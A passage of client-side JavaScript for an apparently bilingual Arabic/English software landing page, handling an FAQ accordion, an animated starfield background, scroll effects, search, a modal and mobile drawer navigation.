    elFaq.innerHTML = t.faq.items.map((item, idx) => `
      <div class="faq-item ${idx === 0 ? 'active' : ''} reveal-on-scroll is-revealed is-dynamic">
        <button class="faq-question">
          <span>${item.q}</span>
          <span class="faq-chevron">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg>
          </span>
        </button>
        <div class="faq-answer" style="${idx === 0 ? 'max-height: 250px;' : ''}">
          <p>${item.a}</p>
        </div>
      </div>
    `).join('');

    elFaq.querySelectorAll('.faq-question').forEach(btn => {
      btn.addEventListener('click', () => {
        const item = btn.closest('.faq-item');
        const isActive = item.classList.contains('active');
        elFaq.querySelectorAll('.faq-item').forEach(other => {
          other.classList.remove('active');
          const ans = other.querySelector('.faq-answer');
          if (ans) ans.style.maxHeight = '';
        });
        if (!isActive) {
          item.classList.add('active');
          const ans = item.querySelector('.faq-answer');
          if (ans) ans.style.maxHeight = ans.scrollHeight + 'px';
        }
      });
    });
  }

  // Card Mouse Spotlight Gradient Effect
  function initCardEffects() {
    const cards = document.querySelectorAll('.exclusive-card, .plugin-card, .stat-glass-card, .about-card');
    cards.forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        card.style.setProperty('--mouse-x', `${e.clientX - rect.left}px`);
        card.style.setProperty('--mouse-y', `${e.clientY - rect.top}px`);
      });
    });
  }

  // Smooth Scroll to Download Section
  function scrollToDownload() {
    const elDownload = document.getElementById('download');
    if (elDownload) {
      elDownload.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }
  }

  // Scroll Darkening Controller ("كل ما أنزل اللون يغمق")
  function updateScrollDarken() {
    const scrollY = window.scrollY || window.pageYOffset || document.documentElement.scrollTop || 0;
    const maxScroll = Math.max(1, document.documentElement.scrollHeight - window.innerHeight);
    const progress = Math.min(1, Math.max(0, scrollY / (maxScroll * 0.72)));
    const darken = (Math.pow(progress, 0.85) * 0.92).toFixed(3);
    document.documentElement.style.setProperty('--scroll-darken', darken);
  }

  // High-Performance Celestial Moving Starfield ("زي نجوم تتحرك ورا")
  function initParticles() {
    const canvas = document.getElementById('bg-canvas');
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let width = 0;
    let height = 0;
    let dpr = Math.min(window.devicePixelRatio || 1, 2);

    function resize() {
      dpr = Math.min(window.devicePixelRatio || 1, 2);
      width = window.innerWidth;
      height = window.innerHeight;
      canvas.width = Math.floor(width * dpr);
      canvas.height = Math.floor(height * dpr);
      canvas.style.width = width + 'px';
      canvas.style.height = height + 'px';
      ctx.setTransform(1, 0, 0, 1, 0, 0);
      ctx.scale(dpr, dpr);
    }
    resize();
    window.addEventListener('resize', resize);

    // Interactive mouse subtle shift
    let mouseX = width / 2;
    let mouseY = height / 2;
    let targetMouseX = mouseX;
    let targetMouseY = mouseY;
    window.addEventListener('mousemove', (e) => {
      targetMouseX = e.clientX;
      targetMouseY = e.clientY;
    }, { passive: true });

    // Generate Stars in 3 Depth Layers
    const starCount = Math.min(220, Math.max(110, Math.floor(width / 7)));
    const stars = [];

    for (let i = 0; i < starCount; i++) {
      const layer = Math.random() < 0.55 ? 1 : Math.random() < 0.85 ? 2 : 3;
      const isViolet = Math.random() < 0.22;
      const isCyan = !isViolet && Math.random() < 0.12;

      let r = layer === 1 ? (Math.random() * 0.6 + 0.45) : layer === 2 ? (Math.random() * 0.8 + 0.95) : (Math.random() * 1.1 + 1.6);
      let baseAlpha = layer === 1 ? (Math.random() * 0.35 + 0.25) : layer === 2 ? (Math.random() * 0.35 + 0.5) : (Math.random() * 0.3 + 0.7);
      let speedY = layer === 1 ? (Math.random() * 0.2 + 0.1) : layer === 2 ? (Math.random() * 0.35 + 0.22) : (Math.random() * 0.55 + 0.35);
      let driftX = (Math.random() - 0.5) * 0.1;

      stars.push({
        x: Math.random() * width,
        y: Math.random() * height,
        r,
        baseAlpha,
        phase: Math.random() * Math.PI * 2,
        twinkleSpeed: Math.random() * 0.035 + 0.015,
        speedY,
        driftX,
        layer,
        color: isViolet ? 'rgba(192, 132, 252,' : isCyan ? 'rgba(56, 189, 248,' : 'rgba(255, 255, 255,'
      });
    }

    // Occasional Shooting Stars (Meteors)
    const meteors = [];
    let lastMeteorTime = Date.now();

    function spawnMeteor() {
      const startX = Math.random() * (width * 0.8) + width * 0.1;
      const startY = Math.random() * (height * 0.35);
      const angle = Math.PI / 4 + (Math.random() - 0.5) * 0.25;
      const speed = Math.random() * 7 + 8;
      meteors.push({
        x: startX,
        y: startY,
        vx: -Math.cos(angle) * speed,
        vy: Math.sin(angle) * speed,
        len: Math.random() * 70 + 60,
        alpha: 1,
        life: 0,
        maxLife: Math.random() * 25 + 35
      });
    }

    function animate() {
      ctx.clearRect(0, 0, width, height);

      // Smooth mouse parallax interpolation
      mouseX += (targetMouseX - mouseX) * 0.04;
      mouseY += (targetMouseY - mouseY) * 0.04;
      const offsetX = (mouseX - width / 2) * 0.015;
      const offsetY = (mouseY - height / 2) * 0.015;

      // Draw and move stars
      for (let i = 0; i < stars.length; i++) {
        const p = stars[i];

        // Cosmic drifting upwards
        p.y -= p.speedY;
        p.x += p.driftX;

        // Wrap around boundaries
        if (p.y < -10) {
          p.y = height + 10;
          p.x = Math.random() * width;
        }
        if (p.x < -10) p.x = width + 10;
        if (p.x > width + 10) p.x = -10;

        // Twinkling shimmer
        p.phase += p.twinkleSpeed;
        const currentAlpha = p.baseAlpha * (0.65 + 0.35 * Math.sin(p.phase));

        // Parallax position
        const drawX = p.x + offsetX * p.layer;
        const drawY = p.y + offsetY * p.layer;

        // Draw star body
        ctx.beginPath();
        ctx.arc(drawX, drawY, p.r, 0, Math.PI * 2);
        ctx.fillStyle = `${p.color} ${currentAlpha.toFixed(3)})`;
        ctx.fill();

        // Extra halo for layer 3 bright stars
        if (p.layer === 3 && currentAlpha > 0.65) {
          ctx.beginPath();
          ctx.arc(drawX, drawY, p.r * 2.5, 0, Math.PI * 2);
          ctx.fillStyle = `${p.color} ${(currentAlpha * 0.18).toFixed(3)})`;
          ctx.fill();
        }
      }

      // Spawn meteors periodically
      const now = Date.now();
      if (now - lastMeteorTime > 4200 && Math.random() < 0.4) {
        spawnMeteor();
        lastMeteorTime = now;
      }

      // Draw and update meteors
      for (let m = meteors.length - 1; m >= 0; m--) {
        const meteor = meteors[m];
        meteor.x += meteor.vx;
        meteor.y += meteor.vy;
        meteor.life++;

        const progress = meteor.life / meteor.maxLife;
        meteor.alpha = 1 - progress;

        if (meteor.life >= meteor.maxLife || meteor.x < -100 || meteor.y > height + 100) {
          meteors.splice(m, 1);
          continue;
        }

        const tailX = meteor.x - (meteor.vx / Math.hypot(meteor.vx, meteor.vy)) * meteor.len;
        const tailY = meteor.y - (meteor.vy / Math.hypot(meteor.vx, meteor.vy)) * meteor.len;

        const grad = ctx.createLinearGradient(tailX, tailY, meteor.x, meteor.y);
        grad.addColorStop(0, 'rgba(168, 85, 247, 0)');
        grad.addColorStop(0.7, `rgba(192, 132, 252, ${(meteor.alpha * 0.6).toFixed(3)})`);
        grad.addColorStop(1, `rgba(255, 255, 255, ${(meteor.alpha * 0.95).toFixed(3)})`);

        ctx.strokeStyle = grad;
        ctx.lineWidth = 1.8;
        ctx.lineCap = 'round';
        ctx.beginPath();
        ctx.moveTo(tailX, tailY);
        ctx.lineTo(meteor.x, meteor.y);
        ctx.stroke();

        // Meteor glowing head
        ctx.beginPath();
        ctx.arc(meteor.x, meteor.y, 2.2, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(255, 255, 255, ${(meteor.alpha).toFixed(3)})`;
        ctx.fill();
      }

      requestAnimationFrame(animate);
    }
    requestAnimationFrame(animate);
  }

  // Setup DOM Event Listeners
  function setupListeners() {
    // Download Buttons
    const btnHeroDl = document.getElementById('hero-btn-download');
    if (btnHeroDl) btnHeroDl.addEventListener('click', scrollToDownload);

    const btnTopDl = document.getElementById('top-btn-download');
    if (btnTopDl) btnTopDl.addEventListener('click', scrollToDownload);

    const btnDrawerDl = document.getElementById('drawer-btn-download');
    if (btnDrawerDl) {
      btnDrawerDl.addEventListener('click', () => {
        closeMobileDrawer();
        scrollToDownload();
      });
    }

    const btnWinDl = document.getElementById('btn-download-windows');
    if (btnWinDl) btnWinDl.addEventListener('click', initiateWindowsDownload);

    // Language Toggles
    const btnLang = document.getElementById('btn-lang');
    if (btnLang) {
      btnLang.addEventListener('click', () => {
        closePluginModal();
        applyLanguage(currentLang === 'ar' ? 'en' : 'ar');
      });
    }

    const btnMobLang = document.getElementById('mobile-btn-lang');
    if (btnMobLang) {
      btnMobLang.addEventListener('click', () => {
        closePluginModal();
        applyLanguage(currentLang === 'ar' ? 'en' : 'ar');
        closeMobileDrawer();
      });
    }

    // Scroll listener for dynamic reveal safety and background darkening
    window.addEventListener('scroll', () => {
      refreshScrollReveal();
      updateScrollDarken();
    }, { passive: true });
    updateScrollDarken();

    // Search Input
    const elSearchInput = document.getElementById('search-input');
    const elSearchClear = document.getElementById('search-clear');
    if (elSearchInput) {
      elSearchInput.addEventListener('input', (e) => {
        searchQuery = e.target.value;
        if (elSearchClear) {
          elSearchClear.style.display = searchQuery ? 'block' : 'none';
        }
        renderPluginsCatalog();
      });
    }
    if (elSearchClear) {
      elSearchClear.addEventListener('click', () => {
        searchQuery = '';
        if (elSearchInput) elSearchInput.value = '';
        elSearchClear.style.display = 'none';
        renderPluginsCatalog();
      });
    }

    // Modal Close
    const modalClose = document.getElementById('modal-close');
    if (modalClose) modalClose.addEventListener('click', closePluginModal);
    const elModal = document.getElementById('plugin-modal');
    if (elModal) {
      elModal.addEventListener('click', (e) => {
        if (e.target === elModal) closePluginModal();
      });
    }

    // Mobile Drawer
    const menuToggle = document.getElementById('menu-toggle');
    const drawerClose = document.getElementById('mobile-drawer-close');
    const drawerBackdrop = document.getElementById('mobile-drawer-backdrop');
    if (menuToggle) menuToggle.addEventListener('click', openMobileDrawer);
    if (drawerClose) drawerClose.addEventListener('click', closeMobileDrawer);
    if (drawerBackdrop) drawerBackdrop.addEventListener('click', closeMobileDrawer);

    document.querySelectorAll('.drawer-link').forEach(link => {
      link.addEventListener('click', closeMobileDrawer);
    });

    // Scroll to Top
    const scrollToTopBtn = document.getElementById('scroll-to-top');
    if (scrollToTopBtn) {
      window.addEventListener('scroll', () => {
        if (window.scrollY > 400) scrollToTopBtn.classList.add('visible');
        else scrollToTopBtn.classList.remove('visible');
      });
      scrollToTopBtn.addEventListener('click', () => {
        window.scrollTo({ top: 0, behavior: 'smooth' });
      });
    }
  }

  function openMobileDrawer() {
    const drawer = document.getElementById('mobile-drawer');
    const backdrop = document.getElementById('mobile-drawer-backdrop');
    if (drawer) drawer.classList.add('is-open');
    if (backdrop) backdrop.classList.add('is-open');
    document.body.style.overflow = 'hidden';
  }

  function closeMobileDrawer() {
    const drawer = document.getElementById('mobile-drawer');
    const backdrop = document.getElementById('mobile-drawer-backdrop');
    if (drawer) drawer.classList.remove('is-open');
    if (backdrop) backdrop.classList.remove('is-open');
    document.body.style.overflow = '';
  }

  // Scroll Reveal Observer
  let scrollObserver = null;

  function refreshScrollReveal() {
    const elements = document.querySelectorAll('.reveal-on-scroll');
    const viewportHeight = window.innerHeight || document.documentElement.clientHeight;
    elements.forEach(el => {
      if (el.classList.contains('is-revealed')) return;
      const rect = el.getBoundingClientRect();
      if (rect.top <= viewportHeight + 100 && rect.bottom >= -50) {
        el.classList.add('is-revealed');
      } else if (scrollObserver) {
        scrollObserver.observe(el);
      } else {
        el.classList.add('is-revealed');
      }
    });
  }

  function initScrollReveal() {
    document.documentElement.classList.add('has-scroll-reveal');

    if (!('IntersectionObserver' in window)) {
      document.querySelectorAll('.reveal-on-scroll').forEach(el => el.classList.add('is-revealed'));
      return;
    }

    if (scrollObserver) {
      scrollObserver.disconnect();
    }

    scrollObserver = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          entry.target.classList.add('is-revealed');
          scrollObserver.unobserve(entry.target);
        }
      });
    }, {
      rootMargin: '0px 0px -20px 0px',
      threshold: 0.05
    });

    refreshScrollReveal();
  }

  // App Initialization
  function init() {
    initParticles();
    initLightbox();
    setupListeners();
    applyLanguage(currentLang);
    initScrollReveal();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
})();
